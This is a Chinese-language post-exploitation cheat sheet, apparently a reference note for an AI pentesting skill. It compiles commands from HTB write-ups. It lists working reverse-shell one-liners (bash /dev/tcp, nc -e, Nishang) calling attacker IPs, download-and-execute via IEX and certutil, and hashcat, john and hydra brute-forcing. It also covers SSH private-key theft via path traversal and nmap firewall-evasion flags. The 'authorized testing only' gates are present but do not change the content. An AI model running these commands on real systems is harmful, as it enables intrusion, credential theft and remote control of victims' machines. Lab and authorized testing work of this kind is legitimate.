# 实战工具箱：shell 后实操（传输 / 稳定化 / 反弹 / 爆破 / 嗅探杂技）

> 来源：用户博客「Bash 逃逸及反弹 Shell 合集」「传输文件」「爆破相关」「字典定制」「端口敲门与单包授权与零开端口」「嗅探与流量转储」等实战沉淀 + HTB writeup 系列散点（Outdated/StreamIO/Pov/Cap 等）。命令逐字摘自原文并标注来源文章。
> 触发场景：拿到低权限 shell 后需要传文件 / 升级交互 / 验证凭据 / 快捕流量；或侦察阶段遇到「主机存活但端口全 filtered」等枚举盲区。
> **仅限授权测试**：反弹 shell 与凭据爆破属 SKILL.md Phase 4「可执行代码」授权项——本 note 的相关章节均挂门禁，与「URLDNS 出网证明 / 只读命令」无害路径并列呈现。

---

## 0. 决策流程

```
拿到 shell
   ↓ §1 升级交互（裸 shell → pty → 全屏）
   ↓ §2 按目标平台选传输通道（Linux 收发 / Windows 入向 / 隧道）
   ↓ 授权允许 RCE 落地 → §3 反弹 shell 矩阵（按语言/平台选条目；默认端口被封 → 443 变体）
   凭据验证需求 → §4 破解矩阵（hashcat 模式 / john 转换器 / cewl 定制字典）
   枚举盲区（全 filtered / 无服务 / 隐写疑点）→ §5 敲门 / 嗅探 / steghide
```

## 1. shell 稳定化与升级（拿到什么 → 用哪条）

| 现状 | 升级命令 | 来源 |
|---|---|---|
| 裸 shell，目标有 python3 | `python3 -c "import pty;pty.spawn('/bin/bash');"` | Bash 逃逸及反弹 Shell 合集 |
| 无 python 时 | `script -qc /bin/bash /dev/null` | Bash 逃逸及反弹 Shell 合集 |
| pty 后要全屏交互（vim/su） | `Ctrl+Z` 挂起 → `stty raw -echo; fg` → `export TERM=xterm` | Bash 逃逸及反弹 Shell 合集 |
| Windows 会话内加载 PS 脚本（免落盘） | `IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.15:8000/PowerView.ps1')` | 传输文件 |

## 2. 跨平台文件传输矩阵

**Linux 入向**（wget/curl 常规不列；scp 指定端口：`scp -P 2222`）。接收端一行起 HTTP/FTP：`python3 -m http.server 80`（来源：Credit Card Scammers Writeup）、`python3 -m pyftpdlib -p 21`（来源：传输文件）。

**Windows 入向**：

| 通道 | 命令 | 来源 |
|---|---|---|
| certutil 下载 | `certutil.exe -urlcache -split -f "http://10.10.16.155:8000/winPEASx64.exe" .` | 传输文件 |
| SMB 直载（UNC） | `sudo impacket-smbserver Enil . -smb2support`（**必须加 -smb2support**，Win10+ 拒 SMB1）；靶机 `copy \\10.10.16.155\Enil\nc64.exe .` | 传输文件 |
| IEX 会话内直载 | `IEX(New-Object Net.WebClient).DownloadString(...)` | 传输文件 |

**出向回传**（靶机 → kali）：nc 重定向（`nc -lvnp 81 \| tee out`，呼应 LinPEAS 无痕回传）。

**隧道（出口受限时）**：chisel 反向隧道——kali `chisel server -p 9595 --reverse`，靶机 `chisel.exe client 10.10.16.58:9595 R:127.0.0.1:1443`（来源：传输文件）。域内隧道（mssqlproxy/proxychains）见 `references/notes/ad-post-compromise.md` §6。

## 3. 反弹 shell 矩阵【门控：仅 Phase 0 授权明确允许 RCE 落地时】

与 playbook 禁令的关系：`rce-deserialization.md`/`ssti.md`/`path-traversal.md` 的「禁反弹 shell、只跑只读命令」是**无授权默认路径**；本节命令只在授权写明「可执行代码」后使用，用于稳固立足点（最小必要原则）。

| 平台/语言 | 命令 | 来源 |
|---|---|---|
| Linux bash | `bash -c "/bin/bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"` | Bash 逃逸及反弹 Shell 合集 |
| Linux nc（-e 可用） | `nc -e /bin/bash 10.10.10.5 443`（防火墙封不常见端口时**改用 443**） | Credit Card Scammers Writeup |
| Windows SMB 直载后台反弹 | `START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe`（START /B 不弹窗） | 反序列化（ysoserial.net 实操） |
| Nishang 尾部追加法 | 脚本尾部 `echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.58 -Port 443" >> Invoke-PowerShellTcp.ps1` 后 `goshs -p 80` 托管 + IEX 拉取（免下载后手动执行） | Bash 逃逸及反弹 Shell 合集 |

验证优先：反弹前先用无回显验证通道确认出网（`ping -n 10 <IP>` + kali tshark 抓 ICMP；来源：HTB-Pov）。

## 4. 凭据爆破与哈希破解矩阵

**速率纪律**（沿用 `unauth-access.md` 先例）：`-t 4 -W 2` 限速、命中即停、喷洒用 `--no-bruteforce` 一一对应防组合爆炸与账号锁定。

| 需求 | 命令 | 来源 |
|---|---|---|
| MD5 爆破 | `sudo hashcat -m 0 -a 0 hash/hash.lst /usr/share/wordlists/rockyou.txt`；`--show` 查已破 | 爆破相关 |
| 7z 哈希 | `hashcat -m 11600`；SSH 私钥用 ssh2john 后 john | 爆破相关 / 公私钥 |
| 密钥容器转哈希 | `/usr/share/john/ssh2john.py hash/id_rsa > crack.txt`；`zip2john`；`7z2john`；`pfx2john` | 爆破相关 / HTB-Search |
| Kerberos/AD 哈希模式 | 18200 AS-REP / 13100 TGS / 5600 NTLMv2 / 14000 NTLMv1（详见 ad-initial-access.md §4.3） | HTB-Blackfield/Rebound 等 |
| 规则变形爆破 | `john --rules --stdout \| sort \| uniq` | 爆破相关 |
| 目标定制字典 | `sudo cewl -d 2 http://10.10.10.48 -w password.txt`（-d 递归深爬 / -m 6 最小词长 / -e 留邮箱）+ john 规则变形管线 | 字典定制 |
| 哈希类型识别 | `nth --file Test`（不确定模式号时先识别） | 加密识别 |
| hydra Web 登录 | `hydra -l admin -P rockyou.txt 10.10.10.43 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=failed"` | 爆破相关 |
| 凭据对合表喷洒 | `hydra -C creds.txt ... https-post-form ...`（SQLi 拖出的凭据对直接喂） | HTB-StreamIO |
| vhost 主动枚举 | `sudo ffuf -H "Host: FUZZ.soulmate.htb" -u http://soulmate.htb -w <subdomains字典> -ac` | 爆破相关 |
| nmap http-brute | 实测 535s/4.5 万次——**慢，优先 hydra** | 爆破相关 |

## 5. 枚举盲区与杂技

- **端口全 filtered 但主机存活 → 想敲门**（来源：端口敲门与单包授权与零开端口）：`knock -v 10.10.10.45 197 719 801 983`；无 knock 时 `for port in 197 719 801 983; do nc -zv 10.10.10.45 $port;sleep 1; done`。立足后查 `/etc/knockd.conf` 还原序列；敲门序列可被监听复现 → 进阶为 SPA/fwknop 单包授权。
- **IP 无开放服务 → 先抓包**：广播/心跳/DHCP 会暴露真实活动（来源：流量包分析；靶机排障先查 NAT/DHCP，来源：如何为靶机配置 DHCP）。
- **pcap hex 负载还原管线**：`tshark -r Enilmalus.pcap -T fields -e data \| tr -d ' ' \| xxd -r -p`（来源：流量包分析）。
- **多层编码凭据还原**：`echo "<b64>" \| base64 -d \| xxd -r -p`（来源：HTB-Mantis）。
- **steghide 隐写提取**：`steghide extract -sf x.jpg`（来源：工具杂项）。
- **SSH 私钥窃取路径**：路径穿越目标优先试 `id_ed25519`（现代默认，id_rsa 常不存在——实测 id_rsa 下载失败而 ed25519 成功；来源：公私钥）；破解链 `ssh2john \| tee key_hash` → `john key_hash`。
- **hosts 首行插入**：`sudo sed -i '1i 10.129.227.191 json.htb' /etc/hosts`（来源：Hosts 记录）。
- **nmap 五变体**（防火墙/IDS 场景）：`-f`（分片）、`--source-port 53`（伪造源端口）、`-r`（顺序扫描）、`--scanflags URGPSHFIN`（自定义 TCP 标志）、`-T2`（慢速）——源自 Linux 提权专区侦察段；出站防火墙封不常见端口时，任何外带/反弹首选 443/80。

## 6. 红线与纪律段

1. **仅限授权测试**：本文件全部技术仅在书面授权或靶场环境使用。
2. **反弹 shell / 爆破授权门禁**（复述 SKILL.md Phase 4）：默认禁止 RCE 落地；授权写明「可执行代码」才进 §3；爆破遵循速率纪律与命中即停，防账号锁定。
3. **与兄弟 note 分工**：本机提权见 `references/notes/privesc-linux-windows.md`；域内隧道与凭据收割见 `references/notes/ad-post-compromise.md`；二进制栈溢出见 `references/notes/binary-stack-overflow.md`。
4. **证据纪律**：命令逐字摘自标注来源文章；凭据类输出按 skill 报告规范脱敏（hash 前 8 字符），不批量导出。
